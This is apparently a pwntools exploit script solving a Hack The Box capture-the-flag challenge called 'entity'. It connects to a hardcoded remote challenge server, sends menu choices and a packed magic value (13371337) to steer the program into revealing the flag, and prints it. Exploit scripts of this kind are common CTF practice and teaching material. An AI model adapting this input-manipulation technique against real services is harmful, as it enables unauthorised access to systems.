#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./entity')

#p = process()
p = remote('94.237.59.180',48195)
p.sendline(b'T')
p.sendline(b'S')
p.sendlineafter(b'>> ',p64(13371337))
p.sendline(b'C')

success(f"flag ---->>>> {p.recvline_contains(b'HTB').strip().decode()}")
p.interactive()
